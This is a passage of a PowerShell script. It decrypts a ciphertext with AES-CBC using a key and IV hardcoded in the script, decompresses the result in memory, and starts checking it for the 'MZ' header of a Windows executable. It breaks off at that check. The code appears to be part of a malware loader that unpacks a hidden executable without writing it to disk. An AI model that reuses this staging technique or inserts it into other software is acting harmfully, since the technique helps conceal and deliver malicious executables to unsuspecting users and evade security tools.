$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key     = [Convert]::FromBase64String('RSl5RqKCLu1c1kUs4vJuRmrhnD2Yt2/7hXSptWlLXnc=')
$aes.IV      = [Convert]::FromBase64String('2sexdLWyo5H5cB46uLB7cA==')
$dec = $aes.CreateDecryptor()
$gzBytes = $dec.TransformFinalBlock($ct, 0, $ct.Length)

# gzip inflate in memory
$ms = New-Object System.IO.MemoryStream(,$gzBytes)
$gz = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$out = New-Object System.IO.MemoryStream
$gz.CopyTo($out)
$pt = $out.ToArray()
$gz.Dispose(); $ms.Dispose(); $out.Dispose()

if ($pt.Length -lt 2 -or $pt[0] -ne 0x4D -or $pt[1] -ne 0x5A) {
